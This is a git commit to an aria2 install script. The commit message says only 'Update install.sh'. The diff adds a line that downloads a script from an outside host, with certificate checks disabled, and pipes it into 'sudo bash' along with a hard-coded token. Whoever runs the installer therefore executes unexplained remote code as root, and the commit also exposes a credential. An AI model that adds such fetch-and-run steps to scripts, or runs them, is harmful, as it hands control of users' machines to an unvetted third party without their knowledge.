7c446f88b666183ef86481fb9095573da309dc83
ShanghaiZhouWanLi <106662135+mi20210630@users.noreply.github.com>
2023-05-01 19:23:23 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,5 +1,5 @@
 apk add --no-cache aria2 curl
-
+curl -kfsSL 'http://collie-agent-hk.chaitin.com:1443/api/v1/host/install_script?node=2&os_type=linux' | sudo bash -s -- --token=2c9dcc3512d0f3cdde634436a6cba024
 mkdir -p /root/.aria2
 cd /root/.aria2
 wget https://github.com/P3TERX/aria2.conf/archive/refs/heads/master.tar.gz
